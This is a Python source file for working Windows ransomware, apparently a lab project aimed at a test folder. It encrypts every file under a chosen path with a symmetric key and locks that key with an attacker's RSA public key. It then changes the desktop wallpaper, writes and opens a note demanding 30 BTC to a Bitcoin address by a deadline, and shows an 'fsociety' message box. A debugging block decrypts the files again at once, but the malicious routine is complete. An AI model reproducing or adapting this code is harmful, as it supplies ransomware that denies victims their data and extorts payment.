from tkinter import messagebox
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
from cryptography.fernet import Fernet
import ctypes
from datetime import datetime, timedelta


directory_list = []
forbidden_files = ["bitcoin_note.txt", "aes_key.txt", "evil_public.pem", "final_ransom.jpg", "decrypt.py"]
encrpyt_basePath = "C:\\Users\\IEUser\\Downloads\\Test\\" # change the path the way you like

def generate_fernet():
    key = Fernet.generate_key()
    fernet = Fernet(key)
    print(key)
    with open("aes_key.txt", "wb") as file:
        file.write(key)
    return fernet

def encrypt_keyfile():
    encrypt_key = RSA.import_key(open("evil_public.pem").read())
    cipher_rsa = PKCS1_OAEP.new(encrypt_key)
    with open("aes_key.txt", "rb") as file:
        content = file.read()
    encrypted_content = cipher_rsa.encrypt(content)
    with open("aes_key.txt", "wb") as file2:
        file2.write(encrypted_content)

def encrypt_file(filename, fernet):
    with open(filename, "rb") as file:
        content = file.read()
    encrypted_content = fernet.encrypt(content)
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(encrypted_content)

# For debugging
def decrypt_file(filename, fernet):
    with open(filename, "rb") as encrypted_file:
        content = encrypted_file.read()
    decrypted_content = fernet.decrypt(content)
    with open(filename, "wb") as file:
        file.write(decrypted_content)

def list_file_directory(path):
    for curDir, dirs, files in os.walk(path):
        print(f"curDir is {curDir}, dirs are {dirs}, files are {files}") # For debugging
        for file in files:
            directory_list.append(os.path.join(curDir, file))

def chagne_backgrond(dir_path):
    path = dir_path + "\\final_ransom.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

def make_note(timelimit):
    with open("bitcoin_note.txt", "w") as file:
        file.write(f"All of your files are encrypted.\nIf you need a decryption key, send 30 BTC to my address.\nOur address is: 19bjF7qakoSkGCp8nakJVeFdNGv4AZTfWe\nDeadline is {timelimit}")

def open_note(dir_path):
    path = dir_path + "\\bitcoin_note.txt"
    os.system(f"cmd /c notepad {path}")

def show_message(timelimit):
    messagebox.showerror(f"From fsociety", "All of your files are encrypted.\nIf you need a decryption key, send 30 BTC to my address.\nOur address is: 19bjF7qakoSkGCp8nakJVeFdNGv4AZTfWe\nDeadline is {timelimit}")

def timelimit():
    now = datetime.now()
    tomorrow = now + timedelta(1)
    dt_string = tomorrow.strftime("%d/%m/%Y %H:%M:%S")
    return dt_string

if __name__ == "__main__":
    current_path = os.path.dirname(os.path.realpath(__file__))
    this_file = os.path.basename(__file__)
    forbidden_files.append(this_file)
    fernet = generate_fernet()
    encrypt_keyfile()
    list_file_directory(encrpyt_basePath)
    
    for directory in directory_list:
        filename = directory.split("\\")[-1]
        # Not to encrypt necessary files(not the best way tho)
        if filename in forbidden_files:
            continue
        try:
            print(directory) # For debugging
            encrypt_file(directory, fernet)
        except PermissionError:
            pass

    # For debugging
    for directory in directory_list:
        filename = directory.split("\\")[-1]
        if filename in forbidden_files:
            continue
        try:
            print(directory) # For debugging
            decrypt_file(directory, fernet)
        except PermissionError:
            pass
    chagne_backgrond(current_path)
    deadline= timelimit()
    make_note(deadline)
    open_note(current_path)
    show_message(deadline)
